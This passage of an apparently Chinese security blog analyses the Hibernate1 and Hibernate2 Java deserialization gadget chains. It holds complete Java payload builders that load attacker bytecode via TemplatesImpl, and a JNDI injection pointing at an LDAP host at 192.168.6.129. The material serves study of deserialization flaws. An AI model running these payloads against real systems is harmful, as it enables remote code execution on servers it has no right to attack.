+而<code>ComponentType#getPropertyValue()</code>方法又会调用<code>componentTuplizer.getPropertyValue()</code>方法。</p>
+<p>通过以下的调用顺序执行了了恶意代码：</p>
+<ol>
+<li><code>TypedValue#hashCode()</code></li>
+<li><code>DeferredInitializer#getValue()</code></li>
+<li><code>DeferredInitializer#initialize()</code></li>
+<li><code>ComponentType#getHashCode()</code></li>
+<li><code>ComponentType#getPropertyValue()</code></li>
+<li><code>AbstractComponentTuplizer#getPropertyValue()</code></li>
+<li><code>BasicGetter#get()</code></li>
+<li><code>TemplatesImpl#getOutputProperties()</code></li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://1jzz.github.io/post-images/1659227837702.png" alt="" loading="lazy"></figure>
+<h2 id="gettermethodimpl">GetterMethodImpl</h2>
+<p>在Hibernate1 5.x里， <code>org.hibernate.property.access.spi.GetterMethodImpl</code> 类能够替代<code>BasicPropertyAccessor$BasicGetter.get()</code>来调用 getter 方法。<br>
+<img src="https://1jzz.github.io/post-images/1659227853626.png" alt="" loading="lazy"></p>
+<h2 id="构造-5">构造</h2>
+<h3 id="hibernate-4x">hibernate 4.X</h3>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    byte[] code = SerialUtil.getBytecodes();
+    TemplatesImpl obj = new TemplatesImpl();
+    SerialUtil.setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code});
+    SerialUtil.setFieldValue(obj, &quot;_name&quot;, &quot;1jzz&quot;);
+    SerialUtil.setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+    Class clazz = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);
+    Constructor constructor = Object.class.getDeclaredConstructor();
+    Permit.setAccessible(constructor);
+    Constructor pojoct = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz, constructor);
+    Permit.setAccessible(pojoct);
+    Object pojoCT = pojoct.newInstance();
+
+    Class clazz1 = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);
+    Class clazz2 = Class.forName(&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;);
+    Constructor constructor1 = clazz2.getDeclaredConstructor(Class.class, Method.class, String.class);
+    constructor1.setAccessible(true);
+    Object getter = constructor1.newInstance(obj.getClass(), obj.getClass().getMethod(&quot;getOutputProperties&quot;),&quot;outputProperties&quot;);
+    Object getters = Array.newInstance(getter.getClass(), 1);
+    Array.set(getters, 0, getter);
+    Field f = clazz1.getDeclaredField(&quot;getters&quot;);
+    f.setAccessible(true);
+    f.set(pojoCT, getters);
+
+    Class clazz3 = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);
+    Constructor constructor2 = Object.class.getDeclaredConstructor();
+    Permit.setAccessible(constructor2);
+    Constructor constructor3 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz3, constructor2);
+    ComponentType componentType = (ComponentType) constructor3.newInstance();
+    TypedValue typedValue = new TypedValue(componentType, null);
+    SerialUtil.setFieldValue(componentType, &quot;componentTuplizer&quot;, pojoCT);
+
+    //满足调用ComponentType的getHashCode方法
+    SerialUtil.setFieldValue(componentType, &quot;propertySpan&quot;, 1);
+
+    HashMap&lt;Object, String&gt; map = new HashMap&lt;&gt;();
+    map.put(typedValue, &quot;1jzz&quot;);
+    SerialUtil.setFieldValue(typedValue, &quot;value&quot;, obj);
+
+    SerialUtil.unserial(SerialUtil.serial(map));
+}
+</code></pre>
+<h3 id="hibernate-5x">hibernate 5.X</h3>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    byte[] code = SerialUtil.getBytecodes();
+    TemplatesImpl obj = new TemplatesImpl();
+    SerialUtil.setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] {code});
+    SerialUtil.setFieldValue(obj, &quot;_name&quot;, &quot;1jzz&quot;);
+    SerialUtil.setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+    Class clazz = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);
+    Constructor constructor = Object.class.getDeclaredConstructor();
+    Permit.setAccessible(constructor);
+    Constructor pojoct = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz, constructor);
+    Permit.setAccessible(pojoct);
+    Object pojoCT = pojoct.newInstance();
+
+    Class clazz1 = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);
+    Class clazz4 = Class.forName(&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;);
+    Constructor constructor4 = clazz4.getDeclaredConstructor(Class.class, String.class, Method.class);
+    Object getter = constructor4.newInstance(obj.getClass(), &quot;outputProperties&quot;, obj.getClass().getMethod(&quot;getOutputProperties&quot;));
+    Object getters = Array.newInstance(getter.getClass(), 1);
+    Array.set(getters, 0, getter);
+    Field f = clazz1.getDeclaredField(&quot;getters&quot;);
+    f.setAccessible(true);
+    f.set(pojoCT, getters);
+
+    Class clazz3 = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);
+    Constructor constructor2 = Object.class.getDeclaredConstructor();
+    Permit.setAccessible(constructor2);
+    Constructor constructor3 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz3, constructor2);
+    ComponentType componentType = (ComponentType) constructor3.newInstance();
+    TypedValue typedValue = new TypedValue(componentType, null);
+    SerialUtil.setFieldValue(componentType, &quot;componentTuplizer&quot;, pojoCT);
+
+    //满足调用ComponentType的getHashCode方法
+    SerialUtil.setFieldValue(componentType, &quot;propertySpan&quot;, 1);
+
+    HashMap&lt;Object, String&gt; map = new HashMap&lt;&gt;();
+    map.put(typedValue, &quot;1jzz&quot;);
+    SerialUtil.setFieldValue(typedValue, &quot;value&quot;, obj);
+
+    SerialUtil.unserial(SerialUtil.serial(map));
+}
+</code></pre>
+<h1 id="hibernate2">Hibernate2</h1>
+<p>通过调用getter方法触发了TemplatesImpl利用链，可以想到fastjson中TemplatesImpl的触发方式。<br>
+那么换位思考，fastjson中的<code>JdbcRowSetImpl#setAutoCommit()</code>调用了<code>JdbcRowSetImpl#connect()</code>方法导致了JNDI注入。是不是也能在hibernate利用链中使用。<br>
+<img src="https://1jzz.github.io/post-images/1659227886092.png" alt="" loading="lazy"><br>
+<img src="https://1jzz.github.io/post-images/1659227868628.png" alt="" loading="lazy"><br>
+由于hibernate利用链中是调用的getter方法，所以我们使用<code>JdbcRowSetImpl#getDatabaseMetaData()</code>方法进行触发JNDI注入。<br>
+<img src="https://1jzz.github.io/post-images/1659227877579.png" alt="" loading="lazy"></p>
+<h3 id="hibernate-4x-2">hibernate 4.X</h3>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
+    jdbcRowSet.setDataSourceName(&quot;ldap://192.168.6.129:1389/zomjsz&quot;);
+    Method method = jdbcRowSet.getClass().getDeclaredMethod(&quot;getDatabaseMetaData&quot;);
+    Class clazz3 = Class.forName(&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;);
+    Constructor constructor4 = clazz3.getDeclaredConstructor(Class.class, Method.class, String.class);
+    constructor4.setAccessible(true);
+    Getter getter = (Getter) constructor4.newInstance(jdbcRowSet.getClass(), method, &quot;databaseMetaData&quot;);
+
+    Class clazz = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);
+    Class clazz1 = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);
+    Constructor constructor = Object.class.getDeclaredConstructor();
+    Permit.setAccessible(constructor);
+    Constructor constructor1 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz, constructor);
+    Permit.setAccessible(constructor1);
+    Object pojoCT = constructor1.newInstance();
+
+    Object getters = Array.newInstance(getter.getClass(), 1);
+    Array.set(getters, 0, getter);
+    Field f = clazz1.getDeclaredField(&quot;getters&quot;);
+    f.setAccessible(true);
+    f.set(pojoCT, getters);
+
+    Class clazz2 = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);
+    Constructor constructor2 = Object.class.getDeclaredConstructor();
+    Permit.setAccessible(constructor2);
+    Constructor constructor3 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz2, constructor2);
+    Permit.setAccessible(constructor3);
+    ComponentType componentType = (ComponentType) constructor3.newInstance();
+    SerialUtil.setFieldValue(componentType, &quot;propertySpan&quot;, 1);
+    SerialUtil.setFieldValue(componentType, &quot;componentTuplizer&quot;, pojoCT);
+
+    TypedValue typedValue = new TypedValue(componentType, null);
+
+    HashMap&lt;Object, String&gt; map = new HashMap&lt;&gt;();
+    map.put(typedValue, &quot;1jzz&quot;);
+
+    SerialUtil.setFieldValue(typedValue, &quot;value&quot;, jdbcRowSet);
+
+    SerialUtil.unserial(SerialUtil.serial(map));
+}
+</code></pre>
+<h3 id="hibernate-5x-2">hibernate 5.x</h3>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+    JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
+    jdbcRowSet.setDataSourceName(&quot;ldap://192.168.6.129:1389/zomjsz&quot;);
+    Method method = jdbcRowSet.getClass().getDeclaredMethod(&quot;getDatabaseMetaData&quot;);
+    GetterMethodImpl getterMethod = new GetterMethodImpl(jdbcRowSet.getClass(), &quot;databaseMetaData&quot;, method);
+
+    Class clazz = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);
+    Class clazz1 = Class.forName(&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;);
+    Constructor constructor = Object.class.getDeclaredConstructor();
+    Permit.setAccessible(constructor);
+    Constructor constructor1 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz, constructor);
+    Permit.setAccessible(constructor1);
+    Object pojoCT = constructor1.newInstance();
+
+    Object getters = Array.newInstance(getterMethod.getClass(), 1);
+    Array.set(getters, 0, getterMethod);
+    Field f = clazz1.getDeclaredField(&quot;getters&quot;);
+    f.setAccessible(true);
+    f.set(pojoCT, getters);
+
+    Class clazz2 = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);
+    Constructor constructor2 = Object.class.getDeclaredConstructor();
+    Permit.setAccessible(constructor2);
+    Constructor constructor3 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz2, constructor2);
+    Permit.setAccessible(constructor3);
+    ComponentType componentType = (ComponentType) constructor3.newInstance();
+    SerialUtil.setFieldValue(componentType, &quot;propertySpan&quot;, 1);
+    SerialUtil.setFieldValue(componentType, &quot;componentTuplizer&quot;, pojoCT);
+
+    TypedValue typedValue = new TypedValue(componentType, null);
+
+    HashMap&lt;Object, String&gt; map = new HashMap&lt;&gt;();
+    map.put(typedValue, &quot;1jzz&quot;);
+
+    SerialUtil.setFieldValue(typedValue, &quot;value&quot;, jdbcRowSet);
+
+    SerialUtil.unserial(SerialUtil.serial(map));
+}
+</code></pre>
+<h1 id="参考">参考</h1>
+<p><a href="https://su18.org/post/ysoserial-su18-3">https://su18.org/post/ysoserial-su18-3</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#cb">CB</a>
+<ul>
+<li><a href="#propertyutils">PropertyUtils</a></li>
+<li><a href="#beancomparator">BeanComparator</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0">构造</a></li>
+<li><a href="#%E6%80%9D%E8%80%83">思考</a></li>
+</ul>
+</li>
+<li><a href="#spring1">Spring1</a>
+<ul>
+<li><a href="#methodinvoketypeprovider">MethodInvokeTypeProvider</a></li>
+<li><a href="#objectfactorydelegatinginvocationhandler">ObjectFactoryDelegatingInvocationHandler</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0-2">构造</a></li>
+<li><a href="#%E4%BE%9D%E8%B5%96">依赖</a></li>
+</ul>
+</li>
+<li><a href="#spring2">Spring2</a>
+<ul>
+<li><a href="#jdkdynamicaopproxy">JdkDynamicAopProxy</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0-3">构造</a></li>
+<li><a href="#%E4%BE%9D%E8%B5%96-2">依赖</a></li>
+</ul>
+</li>
+<li><a href="#groovy1">Groovy1</a>
+<ul>
+<li><a href="#methodclosure">MethodClosure</a></li>
+<li><a href="#stringexecute-%E6%96%B9%E6%B3%95">String.execute() 方法</a></li>
+<li><a href="#convertedclosure">ConvertedClosure</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0-4">构造</a></li>
+<li><a href="#%E4%BE%9D%E8%B5%96-3">依赖</a></li>
+</ul>
+</li>
+<li><a href="#hibernate1">Hibernate1</a>
+<ul>
+<li><a href="#basicpropertyaccessor">BasicPropertyAccessor</a></li>
+<li><a href="#abstractcomponenttuplizer">AbstractComponentTuplizer</a></li>
+<li><a href="#typedvalue">TypedValue</a></li>
+<li><a href="#gettermethodimpl">GetterMethodImpl</a></li>
+<li><a href="#%E6%9E%84%E9%80%A0-5">构造</a>
+<ul>
+<li><a href="#hibernate-4x">hibernate 4.X</a></li>
+<li><a href="#hibernate-5x">hibernate 5.X</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#hibernate2">Hibernate2</a><br>
+*
+<ul>
+<li><a href="#hibernate-4x-2">hibernate 4.X</a></li>
+<li><a href="#hibernate-5x-2">hibernate 5.x</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/V4VzMJqA5/">
+              <h3 class="post-title">
+                CVE-2022-22947 Spring Cloud Gateway RCE
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
